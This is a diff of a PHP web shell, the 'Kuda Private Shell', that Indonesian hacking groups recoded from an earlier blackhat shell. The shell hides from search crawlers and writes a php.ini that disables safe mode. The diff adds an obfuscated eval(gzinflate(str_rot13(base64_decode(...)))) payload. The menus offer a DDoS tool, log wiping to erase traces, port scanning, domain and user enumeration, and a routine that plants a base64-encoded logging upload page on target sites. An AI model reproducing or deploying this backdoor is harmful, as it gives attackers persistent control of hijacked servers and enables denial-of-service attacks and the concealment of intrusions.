@@ -3,7 +3,6 @@ session_start();
 error_reporting(0);
 set_time_limit(0);
 date_default_timezone_set('Asia/Jakarta');
-$katasandi = 'fddd7dce121719c9aab2ded76867d2f9';
 @set_magic_quotes_runtime(0);
 @clearstatcache();
 @ini_set('error_log',NULL);
@@ -11,13 +10,14 @@ $katasandi = 'fddd7dce121719c9aab2ded76867d2f9';
 @ini_set('max_execution_time',0);
 @ini_set('output_buffering',0);
 @ini_set('display_errors',0);
+$katasandi = 'fddd7dce121719c9aab2ded76867d2f9';
 $color = "#00ff00";
 $default_action = 'FilesMan';
 $default_use_ajax = true;
 $default_charset = 'UTF-8';
-// Fuction biar gak kecache sama google //
+// Function biar gak kecache sama google gan :v //
 if(!empty($_SERVER['HTTP_USER_AGENT'])) {
-    $userAgents = array("Googlebot", "Google", "Robots", "IExplorer", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
+    $userAgents = array("Googlebot", "Google", "Robot", "IExplorer", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
     if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
         header('HTTP/1.0 404 Not Found');
         exit;
@@ -25,9 +25,9 @@ if(!empty($_SERVER['HTTP_USER_AGENT'])) {
 }
 function login_shell() {
 ?>
-<script language='javascript'>
-document.write(unescape('%3c%68%74%6d%6c%3e%20%3c%68%65%61%64%3e%20%3c%74%69%74%6c%65%3e%58%48%41%4d%53%54%45%52%3c%2f%74%69%74%6c%65%3e%20%3c%73%74%79%6c%65%20%74%79%70%65%3d%22%74%65%78%74%2f%63%73%73%22%3e%20%40%69%6d%70%6f%72%74%20%75%72%6c%28%27%68%74%74%70%73%3a%2f%2f%66%6f%6e%74%73%2e%67%6f%6f%67%6c%65%61%70%69%73%2e%63%6f%6d%2f%63%73%73%3f%66%61%6d%69%6c%79%3d%49%63%65%62%65%72%67%27%29%3b%20%68%74%6d%6c%20%7b%20%6d%61%72%67%69%6e%3a%20%35%30%70%78%20%61%75%74%6f%3b%20%62%61%63%6b%67%72%6f%75%6e%64%3a%20%62%6c%61%63%6b%3b%20%7d%20%70%72%65%20%7b%20%66%6f%6e%74%2d%66%61%6d%69%6c%79%3a%20%27%49%63%65%62%65%72%67%27%3b%20%63%6f%6c%6f%72%3a%20%63%79%61%6e%3b%20%7d%20%69%6e%70%75%74%5b%74%79%70%65%3d%70%61%73%73%77%6f%72%64%5d%20%7b%20%62%61%63%6b%67%72%6f%75%6e%64%3a%20%62%6c%61%63%6b%3b%20%63%6f%6c%6f%72%3a%20%63%79%61%6e%3b%20%6d%61%72%67%69%6e%3a%20%30%20%31%30%70%78%3b%20%66%6f%6e%74%2d%73%69%7a%65%3a%20%31%33%70%78%3b%20%74%65%78%74%2d%61%6c%69%67%6e%3a%20%63%65%6e%74%65%72%3b%20%62%6f%72%64%65%72%3a%20%62%6c%61%63%6b%3b%20%7d%20%69%6e%70%75%74%5b%74%79%70%65%3d%73%75%62%6d%69%74%5d%7b%62%61%63%6b%67%72%6f%75%6e%64%3a%20%62%6c%61%63%6b%3b%20%63%6f%6c%6f%72%3a%20%72%65%64%3b%20%6d%61%72%67%69%6e%3a%20%30%20%34%70%78%3b%20%66%6f%6e%74%2d%73%69%7a%65%3a%20%31%33%70%78%3b%20%66%6f%6e%74%2d%77%65%69%67%68%74%3a%20%62%6f%6c%64%3b%62%6f%72%64%65%72%3a%20%31%70%78%20%73%6f%6c%69%64%20%67%72%61%79%3b%20%63%75%72%73%6f%72%3a%20%70%6f%69%6e%74%65%72%3b%20%2d%6d%6f%7a%2d%62%6f%72%64%65%72%2d%72%61%64%69%75%73%3a%20%35%70%78%3b%20%2d%77%65%62%6b%69%74%2d%62%6f%72%64%65%72%2d%72%61%64%69%75%73%3a%20%35%70%78%3b%20%2d%6b%68%74%6d%6c%2d%62%6f%72%64%65%72%2d%72%61%64%69%75%73%3a%20%35%70%78%3b%20%7d%20%2e%6b%75%64%61%7b%20%2d%77%65%62%6b%69%74%2d%61%6e%69%6d%61%74%69%6f%6e%2d%6e%61%6d%65%3a%20%62%6c%69%6e%6b%65%72%3b%20%2d%77%65%62%6b%69%74%2d%61%6e%69%6d%61%74%69%6f%6e%2d%64%75%72%61%74%69%6f%6e%3a%20%33%73%3b%20%2d%77%65%62%6b%69%74%2d%61%6e%69%6d%61%74%69%6f%6e%2d%74%69%6d%69%6e%67%2d%66%75%6e%63%74%69%6f%6e%3a%20%6c%69%6e%65%61%72%3b%20%2d%77%65%62%6b%69%74%2d%61%6e%69%6d%61%74%69%6f%6e%2d%69%74%65%72%61%74%69%6f%6e%2d%63%6f%75%6e%74%3a%20%69%6e%66%69%6e%69%74%65%3b%20%20%2d%6d%6f%7a%2d%61%6e%69%6d%61%74%69%6f%6e%2d%6e%61%6d%65%3a%20%62%6c%69%6e%6b%65%72%3b%20%2d%6d%6f%7a%2d%61%6e%69%6d%61%74%69%6f%6e%2d%64%75%72%61%74%69%6f%6e%3a%20%32%73%3b%20%2d%6d%6f%7a%2d%61%6e%69%6d%61%74%69%6f%6e%2d%74%69%6d%69%6e%67%2d%66%75%6e%63%74%69%6f%6e%3a%20%6c%69%6e%65%61%72%3b%20%2d%6d%6f%7a%2d%61%6e%69%6d%61%74%69%6f%6e%2d%69%74%65%72%61%74%69%6f%6e%2d%63%6f%75%6e%74%3a%20%69%6e%66%69%6e%69%74%65%3b%20%20%61%6e%69%6d%61%74%69%6f%6e%2d%6e%61%6d%65%3a%20%62%6c%69%6e%6b%65%72%3b%20%61%6e%69%6d%61%74%69%6f%6e%2d%64%75%72%61%74%69%6f%6e%3a%20%31%73%3b%20%61%6e%69%6d%61%74%69%6f%6e%2d%74%69%6d%69%6e%67%2d%66%75%6e%63%74%69%6f%6e%3a%20%6c%69%6e%65%61%72%3b%20%61%6e%69%6d%61%74%69%6f%6e%2d%69%74%65%72%61%74%69%6f%6e%2d%63%6f%75%6e%74%3a%20%69%6e%66%69%6e%69%74%65%3b%20%7d%20%40%2d%6d%6f%7a%2d%6b%65%79%66%72%61%6d%65%73%20%62%6c%69%6e%6b%65%72%20%7b%20%30%25%20%7b%20%6f%70%61%63%69%74%79%3a%20%31%2e%30%3b%20%7d%20%35%30%25%20%7b%20%6f%70%61%63%69%74%79%3a%20%30%2e%30%3b%20%7d%20%31%30%30%25%20%7b%20%6f%70%61%63%69%74%79%3a%20%31%2e%30%3b%20%7d%20%7d%20%40%2d%77%65%62%6b%69%74%2d%6b%65%79%66%72%61%6d%65%73%20%62%6c%69%6e%6b%65%72%20%7b%20%20%20%30%25%20%7b%20%6f%70%61%63%69%74%79%3a%20%31%2e%30%3b%20%7d%20%35%30%25%20%7b%20%6f%70%61%63%69%74%79%3a%20%30%2e%30%3b%20%7d%20%31%30%30%25%20%7b%20%6f%70%61%63%69%74%79%3a%20%31%2e%30%3b%20%7d%20%7d%20%40%6b%65%79%66%72%61%6d%65%73%20%62%6c%69%6e%6b%65%72%20%7b%20%20%20%30%25%20%7b%20%6f%70%61%63%69%74%79%3a%20%31%2e%30%3b%20%7d%20%35%30%25%20%7b%20%6f%70%61%63%69%74%79%3a%20%30%2e%30%3b%20%7d%20%31%30%30%25%20%7b%20%6f%70%61%63%69%74%79%3a%20%31%2e%30%3b%20%7d%20%7d%20%3c%2f%73%74%79%6c%65%3e%20%3c%2f%68%65%61%64%3e%20%3c%62%6f%64%79%3e%20%3c%63%65%6e%74%65%72%3e%20%3c%66%6f%72%6d%20%6d%65%74%68%6f%64%3d%22%70%6f%73%74%22%3e%3c%69%6e%70%75%74%20%74%79%70%65%3d%22%70%61%73%73%77%6f%72%64%22%20%6e%61%6d%65%3d%22%70%61%73%73%22%20%73%74%79%6c%65%3d%22%63%6f%6c%6f%72%3a%20%62%6c%61%63%6b%3b%22%3e%3c%2f%66%6f%72%6d%3e%20%3c%62%72%3e%20%20%20%20%20%3c%68%31%3e%20%20%20%20%20%20%20%20%20%3c%70%72%65%20%63%6c%61%73%73%3d%22%6b%75%64%61%22%3e%20%56%69%73%69%74%65%64%20%42%79%20%4d%72%2e%78%42%61%72%61%6b%75%64%61%20%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%20%23%42%61%62%62%79%20%43%79%62%65%72%20%54%65%61%6d%20%20%20%20%20%20%20%20%20%3c%2f%70%72%65%3e%20%20%20%20%20%3c%2f%68%31%3e%20%3c%66%6f%72%6d%20%6d%65%74%68%6f%64%3d%22%6d%6d%6b%22%3e%3c%69%6e%70%75%74%20%74%79%70%65%3d%22%70%61%73%73%77%6f%72%64%22%20%6e%61%6d%65%3d%22%70%61%73%73%22%3e%3c%2f%66%6f%72%6d%3e%20%3c%2f%63%65%6e%74%65%72%3e%20%3c%2f%62%6f%64%79%3e'));
-</script>
+<?
+eval(gzinflate(str_rot13(base64_decode('ckTvYpswEP0+dv/DDVrylw2neiZoCVLqGqJRyhpTyKZ2qiIXXwst2Mw2WvnvdH4sCRtfuLv3fO/dHSapBMd7N1vfxD/DABbx1xWE2y+r5Q2Qj5Qug2tB6SyeaMi5O6I0uCX+2zdgPy81Un6IkfG/sclZjv5rNIZbdmAuK8E92hV7Bnrp3r3k9aHBmX/CtkxfL/04UkP4u096kMM2TYEz7UB5/L/feoLoexD9IkTweht54t02TZK7RorTxXumTkuNh1MDpACTcxo0qhdHrlTLo+Q155nJpGBsXn8ABoNMAJWSqu2GIrEVg8oa26dMjmBHnYlUMBIqjcAEBA1sJpOqQG6abcoEYojHqUG1RuUPpmY8xrlPrX3HPUHa/Wqb9Tz+ZB0F5M5oYNPOAczAKWYRx+Fhsd7ELSeUdwj3jcJo1BI8bUMbmqDtqexdmpP/gyXYecD3HqQqoECTV35SV6kN8b1ZlJWdui7RlpjWe6k4AcGKPiegWp3bJJG5R5NziQanY8+S51TVLHtvN8qELpmyKhaw79HyU+UrdZl0vH9O/jPcuLGGe2YDlGs6REzZ+2UMvhr6xF5LSmhAq+TKVo0pJ5TWskVUzFpxTs8/X158ujwbj+lmxdmF+6QdK9QRfDL9Aw=='))));
+?>
 <?php
 exit;
 }
@@ -61,10 +61,10 @@ if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')
 @import url('http://fonts.googleapis.com/css?family=Share+Tech+Mono');
 @import url('http://fonts.googleapis.com/css?family=Iceland');
 html {
-background: black;
+background: #111111;
 color: #ffffff;
 font-family: 'Share Tech Mono';
-font-size: 12.8px;
+font-size: 12.7px;
 width: 100%;
 }
 li {
@@ -84,7 +84,7 @@ table, th, td {
 border-collapse: collapse;
 background: transparent;
 font-family: 'Share Tech Mono';
-font-size: 12.8px;
+font-size: 12.5px;
 }
 .table_home, .th_home, .td_home {
 border: 1px solid deepskyblue;
@@ -103,14 +103,14 @@ text-decoration: underline;
 b {
 color: #F6D155;
 }
-input[type=text], input[type=password],input[type=submit] {
+input[type=text],input[type=password],input[type=submit] {
 background: transparent; 
 color: #ffffff; 
 border: 1px solid #ffffff; 
 margin: 5px auto;
 padding-left: 5px;
 font-family: 'Share Tech Mono';
-font-size: 12.8px;
+font-size: 12.5px;
 }
 input[type=submit] {
 background: #191919; 
@@ -119,7 +119,7 @@ border: 1px solid #ffffff;
 margin: 5px auto;
 padding-left: 5px;
 font-family: 'Share Tech Mono';
-font-size: 12.8px;
+font-size: 12.5px;
 cursor: pointer;
 }
 textarea {
@@ -132,7 +132,7 @@ resize: none;
 background: transparent;
 color: #ffffff;
 font-family: 'Share Tech Mono';
-font-size: 12.8px;
+font-size: 12.5px;
 }
 select {
 width: 152px;
@@ -142,7 +142,7 @@ border: 1px solid #ffffff;
 margin: 5px auto;
 padding-left: 5px;
 font-family: 'Share Tech Mono';
-font-size: 12.8px;
+font-size: 12.5px;
 }
 option:hover {
 background: dimgray;
@@ -184,28 +184,16 @@ animation-iteration-count: infinite;
     </style>
 </head>
 <?php
-////////////////////////////////////////////////////////////////////////
-// Kalo mau recode lagi silahkan.                                    //
-// Tapi yang kreatif ya gan, jangan cuma ganti background nya saja. //
-// Recoded Nusantara_Blackhat Shell By Mr.xBarakuda                //
-////////////////////////////////////////////////////////////////////
 if(file_exists('php.ini')) {
 } else {
 $img = fopen('php.ini', 'w');
 $sec = "safe_mode = OFF
 disable_functions = NONE";
-fwrite($img, $sec);
+fwrite($img,$sec);
 fclose($img);
 }
 function w($dir,$perm) {
     if(!is_writable($dir)) {
-        return "<font color=red>".$perm."</font>";
-    } else {
-        return "<font color=cyan>".$perm."</font>";
-    }
-}
-function r($dir,$perm) {
-    if(!is_readable($dir)) {
         return "<font color=red>".$perm."</font>";
     } else {
         return "<font color=cyan>".$perm."</font>";
@@ -467,7 +455,7 @@ echo "Port: <font color=deepskyblue>".$sport."</font><br>";
 echo "Time On Server: <font color=deepskyblue>".date("d-M-Y / h:i a")."</font><br>";
 echo "Safe Mode: ".$sm."<br>";
 echo "Disable Functions: ".$ds."<br>";
-echo "MYSQL: ".$mysql." | PERL: ".$perl." | PYTHON: ".$python." | WGET: ".$wget." | CURL: ".$curl." <br>";
+echo "MYSQL: ".$mysql." | PERL: ".$perl." | PYTHON: ".$python." | WGET: ".$wget." | CURL: ".$curl."<br>";
 echo "Current DIR: ";
 foreach($scdir as $c_dir => $cdir) {   
     echo "<a href='?dir=";
@@ -510,7 +498,7 @@ echo "<li> <a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0p
 echo "<p>";
 echo "<li> <a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=krdp_shell'>K-RDP Shell</a> </li>";
 echo "<li> <a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=ddos'>DDoS</a> </li>";
-echo "<li> <a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=domains'>Domain Viewer</a> </li>";
+echo "<li> <a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=domains'>Domains Viewer</a> </li>";
 echo "<li> <a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=ports'>Port Scanner</a> </li>";
 echo "<li> <a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=adminer'>Adminer</a> </li>";
 echo "<li> <a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=csrf'>CSRF Online</a> </li>";
@@ -772,7 +760,7 @@ elseif($_GET['do'] == 'delogs') {
 
 	sleep(4);
 
-	echo '<br><p><i>Your Traces Has Been Successfully Deleting ...From the Server</i></p>';
+	echo '<p><i>Your Traces Has Been Successfully Deleting ...From the Server</i></p><br>';
 	echo '</center>';
     echo '</table></td></tr>';
 }
@@ -982,9 +970,9 @@ $kudagans="lUh6Yts2EP5hwP/hygWQA6SWX+o2Ziy3duquBdouVdJo2EMYlFFbeSRFIanYztr/3qMkW
 elseif($_GET['do'] == 'ddos') {
 ?>
 <form action=" " method="post">
-<center><br>
-Your IP: <font color="red"><?php echo $_SERVER["REMOTE_ADDR"]; ?></font>&nbsp;( Don't DoS Yourself Noob )<br><br>
-<th colspan="5"><h1>Ddos Tool</th></h1>
+<center>
+Your IP: <font color="red"><?php echo $_SERVER["REMOTE_ADDR"]; ?></font>&nbsp;( Don't DoS Yourself Noob )
+<h1>DDoS Tool</h1>
 <table>
 <tr><tr><td>IP Target</td><td>:</td>
 <td><input type="text" class="inputz" name="ip" size="48" maxlength="25"  value = "0.0.0.0" onblur = "if ( this.value=='' ) this.value = '0.0.0.0';" onfocus = " if ( this.value == '0.0.0.0' ) this.value = '';"/>
@@ -997,9 +985,8 @@ Your IP: <font color="red"><?php echo $_SERVER["REMOTE_ADDR"]; ?></font>&nbsp;( 
 </td></tr></tr></table><br>
 <input type="submit" class="inputzbut" name="fire" value="Fire!">
 <br><br>
-<center>
 After initiating the DoS attack, please wait while the browser loads.
-</center></th></center></form></center></form>
+</th></center></form></tr></tr></center></form>
 <?php
     $submit = $_POST['fire'];
     if (isset($submit)) {
@@ -1050,7 +1037,7 @@ $text = $_POST['code'];
 <option value="gzinflatew">str_rot13-convert_uu-url-gzinflate-str_rot13-base64-convert_uu-gzinflate-url-str_rot13-gzinflate-base64</option>
 <option value="str">str_rot13 - gzinflate - str_rot13 - base64</option>
 <option value="url">base64 - gzinflate - str_rot13 - convert_uu - gzinflate - base64</option>
-<option value="hexencode">Hex Encode/Decode</option>
+<option value="hexencode">Hex</option>
 <option value="str_rot13">ROT13 Hash</option>
 <option value="strlen">strlen</option>
 <option value="xxx">unescape</option>
@@ -1059,7 +1046,8 @@ $text = $_POST['code'];
 <option value="www">chr</option>
 <option value="sss">htmlspecialchars</option>
 <option value="eee">escape</option>
-</select>&nbsp;<input type='submit' name='encd' value='Encode'>
+</select>&nbsp;<br>
+<input type='submit' name='encd' value='Encode'>
 <input type='submit' name='decd' value='Decode'>
 </form></center>
 <br>
@@ -1254,13 +1242,13 @@ echo "</center>";
     if($_POST['make']) {
       foreach($target as $korban) {
         $global = "upload.php";
-        $isi_nama_doang = "PD9waHANCi8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCi8vIFRoaXMgTG9nZ2VkIENvZGVkIEJ5IE1yLnhCYXJha3VkYSAgICAvLw0KLy8gTWFrZSBhIHRyYXAgYW5kIFRyb2xsIHRoZSBMYW1lcnMgOnYgLy8NCi8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCmRhdGVfZGVmYXVsdF90aW1lem9uZV9zZXQoJ0FzaWEvSmFrYXJ0YScpOw0KJGlwID0gJF9TRVJWRVJbJ1JFTU9URV9BRERSJ107DQokcG9ydCA9ICRfU0VSVkVSWydSRU1PVEVfUE9SVCddOw0KJHByb3RvY29sID0gJF9TRVJWRVJbJ1NFUlZFUl9QUk9UT0NPTCddOw0KJGFnZW50ID0gJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KJHRnbCA9IGRhdGUoImQgTSBZIGg6aTpzIGEiKTsNCiRsb2cgPSBmb3Blbigna3VkYV9sb2cudHh0JyAsYSk7DQpmd3JpdGUoJGxvZyAsIi09LT0tPS09LT0tPS0iLiIgIik7DQpmd3JpdGUoJGxvZyAsIiBKRUJBS0FOIEdBTiAiLiIgIik7DQpmd3JpdGUoJGxvZyAsIi09LT0tPS09LT0tPS0iLiIgIik7DQpmd3JpdGUoJGxvZyAsIiBJUCBBZGRyZXNzOiAiLiRpcC4iIExvZ2dlZCBPbiA9PiBbICIuJHRnbC4iIF0iLiIgIik7DQpmd3JpdGUoJGxvZyAsIiBQb3J0IE51bWJlcjogIi4kcG9ydC4iICIpOw0KZndyaXRlKCRsb2cgLCIgUHJvdG9jb2w6ICIuJHByb3RvY29sLiIgIik7DQpmd3JpdGUoJGxvZyAsIiBVc2VyIEFnZW50OiBbICIuJGFnZW50LiIgXSIuIiAiKTsNCmZ3cml0ZSgkbG9nICwiLT0tPS09LT0tPS09LSIuIiAiKTsNCj8+DQo8IURPQ1RZUEUgSFRNTD4NCjxodG1sPg0KPGhlYWQ+DQo8dGl0bGU+VXBsb2FkIFlvdXIgSW1hZ2U8L3RpdGxlPg0KPC9oZWFkPg0KPGJvZHk+DQo8Zm9ybSBhY3Rpb249InByb2NjZXNzX2NoZWNrLnBocCIgbWV0aG9kPSJwb3N0IiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIj4NCjxwPlNlbGVjdCBpbWFnZSB0byB1cGxvYWQ6PC9wPg0KPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGVUb1VwbG9hZCIgaWQ9ImZpbGVUb1VwbG9hZCI+DQo8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iVXBsb2FkIEZpbGUiIG5hbWU9InN1Ym1pdCI+DQo8L2Zvcm0+DQo8L2JvZHk+DQo8L2h0bWw+";
+        $isi_nama_doang = "PD9waHANCi8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCi8vIFRoaXMgTG9nZ2VkIENvZGVkIEJ5IE1yLnhCYXJha3VkYSAgICAvLw0KLy8gTWFrZSBhIHRyYXAgYW5kIFRyb2xsIHRoZSBMYW1lcnMgOnYgLy8NCi8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCmRhdGVfZGVmYXVsdF90aW1lem9uZV9zZXQoJ0FzaWEvSmFrYXJ0YScpOw0KJGlwID0gJF9TRVJWRVJbJ1JFTU9URV9BRERSJ107DQokcG9ydCA9ICRfU0VSVkVSWydSRU1PVEVfUE9SVCddOw0KJHByb3RvY29sID0gJF9TRVJWRVJbJ1NFUlZFUl9QUk9UT0NPTCddOw0KJG1ldGhvZCA9ICRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddOw0KJGFnZW50ID0gJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KJHRnbCA9IGRhdGUoImQtTS1ZIC8gaDppIGEiKTsNCiRsb2cgPSBmb3Blbigna3VkYV9sb2cudHh0JyAsYSk7DQpmd3JpdGUoJGxvZyAsIi09LT0tPS09LT0tPS0iLiIgIik7DQpmd3JpdGUoJGxvZyAsIiBKRUJBS0FOIEdBTiAiLiIgIik7DQpmd3JpdGUoJGxvZyAsIi09LT0tPS09LT0tPS0iLiIgIik7DQpmd3JpdGUoJGxvZyAsIiBJUCBBZGRyZXNzOiAiLiRpcC4iIExvZ2dlZCBPbiA9PiBbICIuJHRnbC4iIF0iLiIgIik7DQpmd3JpdGUoJGxvZyAsIiBQb3J0IE51bWJlcjogIi4kcG9ydC4iICIpOw0KZndyaXRlKCRsb2cgLCIgUHJvdG9jb2w6ICIuJHByb3RvY29sLiIgIik7DQpmd3JpdGUoJGxvZyAsIiBVc2VyIEFnZW50OiBbICIuJGFnZW50LiIgXSIuIiAiKTsNCmZ3cml0ZSgkbG9nICwiIE1ldGhvZDogIi4kbWV0aG9kLiIgIik7DQpmd3JpdGUoJGxvZyAsIi09LT0tPS09LT0tPS0iLiIgIik7DQo/Pg0KPCFET0NUWVBFIEhUTUw+DQo8aHRtbD4NCiAgICA8aGVhZD4NCiAgICAgICAgPHRpdGxlPlVwbG9hZCBZb3VyIEltYWdlPC90aXRsZT4NCiAgICA8L2hlYWQ+DQogICAgPGJvZHk+DQogICAgICAgIDxmb3JtIGFjdGlvbj0icHJvY2Nlc3NfY2hlY2sucGhwIiBtZXRob2Q9InBvc3QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiPg0KICAgICAgICAgICAgPHA+U2VsZWN0IGltYWdlIHRvIHVwbG9hZDo8L3A+DQogICAgICAgICAgICA8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZVRvVXBsb2FkIiBpZD0iZmlsZVRvVXBsb2FkIj4NCiAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJVcGxvYWQgRmlsZSIgbmFtZT0ic3VibWl0Ij4NCiAgICAgICAgPC9mb3JtPg0KICAgIDwvYm9keT4NCjwvaHRtbD4=";
         $decode_isi = base64_decode($isi_nama_doang);
         $encode = base64_encode($global);
         $ss = fopen($global,"w");
         fputs($ss, $decode_isi);
         echo "[+] <a href='$korban' target='_blank'>$korban</a><br>";
-        echo "Done Fake Arbitrary Upload Honeypot [ upload.php ] berhasil di tanam tinggal nunggu siapa kejebak wkwk<br>";
+        echo "Done Fake Arbitrary Upload Honeypot ada di => ".$dir." [ upload.php ] berhasil di tanam tinggal nunggu siapa kejebak wkwk<br>";
         $url_mkfile = "$korban?cmd=mkfile&name=$global&target=l1_Lw";
         $post1 = array(
             "target" => "l1_$encode",
@@ -2223,8 +2211,9 @@ elseif($_GET['do'] == 'loghunter') {
 echo '<center><h1>Log Hunter</h1></center>';
 echo "<center>";
 echo "<form action='' method='post'>"; 
-?><br>DIR: <input type="text" value="<?=getcwd();?>" name="shc_dir"><?php
-echo "<input type='submit' name='submit' class='kotak' value='Scan Now!'>"; 
+?><br>DIR: <input type="text" style="width: 200px;" value="<?=getcwd();?>" name="shc_dir">
+<?php
+echo "<input type='submit' name='submit' value='Scan Now!'>"; 
 echo "</form>"; 
 echo "<pre style='text-align: left;'>";
 error_reporting(0);
@@ -3281,7 +3270,7 @@ elseif($_GET['do'] == 'kill') {
 		else
 			echo '<center>unlink failed!</center>';
 }
-elseif($_GET['do'] == 'domains'){echo "<center><div class='mybox'><p align='center' class='cgx2'>Domains and Users</p>";$d0mains = @file("/etc/named.conf");if(!$d0mains){die("<center>Error: can't read [ <font color=red><i>/etc/named.conf</font></i> ]</center>");}echo '<table id="output"><tr bgcolor=#cecece><td>Domains</td><td>users</td></tr>';foreach($d0mains as $d0main){if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);flush();if(strlen(trim($domains[1][0])) > 2){$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));echo "<tr><td><a href=http://www.".$domains[1][0]."/>".$domains[1][0]."</a></td><td>".$user['name']."</td></tr>";flush();}}}echo'</div></center>';
+elseif($_GET['do'] == 'domains'){echo "<center><h1>Domains and Users</h1>";$d0mains = @file("/etc/named.conf");if(!$d0mains){die("<center>Error: can't read [ <font color=red><i>/etc/named.conf</font></i> ]</center>");}echo '<table id="output"><tr bgcolor=#cecece><td>Domains</td><td>users</td></tr>';foreach($d0mains as $d0main){if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);flush();if(strlen(trim($domains[1][0])) > 2){$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));echo "<tr><td><a href=http://www.".$domains[1][0]."/>".$domains[1][0]."</a></td><td>".$user['name']."</td></tr>";flush();}}}echo'</center>';
 }
 elseif($_GET['do'] == 'ports') {
     
@@ -4007,7 +3996,7 @@ elseif($_GET['do'] == 'about') {
         <h1 style='color: cyan;' class='kuda'>Kuda Private Shell Recoded From Nusantara Blackhat Shell</h1>
         <p style='color: white;'>GreetZ:</p>
         <font color="cyan">[</font>
-        <marquee behavior="alternate" scrollamount="10" style="width: 40%;">All Member From BabbyCyberTeam - IndoXploit - Nusantara Blackhat And You:)</marquee>
+        <marquee behavior="alternate" scrollamount="10" style="width: 50%;">All Member From BabbyCyberTeam - IndoXploit - Nusantara Blackhat And You:)</marquee>
         <font color="cyan">]</font>
         <p>Gue gans, thanks:)</p>
       </center>
